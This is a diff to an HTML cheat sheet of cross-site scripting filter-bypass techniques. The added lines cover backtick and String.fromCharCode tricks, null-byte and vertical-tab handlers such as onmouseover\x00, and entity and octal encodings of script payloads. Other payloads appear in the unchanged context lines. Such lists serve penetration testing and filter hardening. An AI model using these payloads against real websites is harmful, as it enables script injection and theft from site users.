@@ -76,6 +76,9 @@ New Line breaks often work on <.a/href=%2520javascript:alert(1)>  <.a/href=%20ja
 Injecting anchor tag without whitespaces -breaking up characters with decoded value of %26Tab%3B (url decode character) between each character<br>
  <br>
  Try bypassing spaces with a bullet if / does not work - <code><.svg•onload=alert(1)> </code><br>
+ To bypass parenthesis for string using ` <br>
+ To bypass quotes for string use String.fromCharCode() function
+ Bypassing on...= filter using null byte onmouseover\x00="alert(1)",  Using vertical tab - onmouseover\x0b="alert(1)", Using a / - onmouseover/="alert(1)"
  <br>
  <h3> Encoding </h3>
  Try URL encoding on the payload <br>
@@ -88,7 +91,9 @@ Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was transform
 E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/ <br>
 %EF%BC%9E becomes > <br>
 %EF%BC%9C becomes < <br>
- Try UTF-7, UTF-8 UTF-16BE, UTF-32 encoding
+ Try UTF-7, UTF-8 UTF-16BE, UTF-32 encoding, Base64 encoding, Hexadecimal encoding without semicolon, Decimal HTML character, <br>
+ Decimal HTML character without semicolon (<.script>alert(1)<./script> to &#60&#115&#99&#114&#105&#112&#116&#62&#97&#108&#101&#114&#116&#40&#49&#41&#60&#47&#115&#99&#114&#105&#112&#116&#62),  Octal encoding (javascript:prompt(1) to javascript:'\160\162\157\155\160\164\50\61\51) <br>
+ 
  <br>
  <h3> File Upload XSS </h3><br>
  If you find a file upload feature, try naming the file to an xss payload. Use burp intercept to rename files <br>
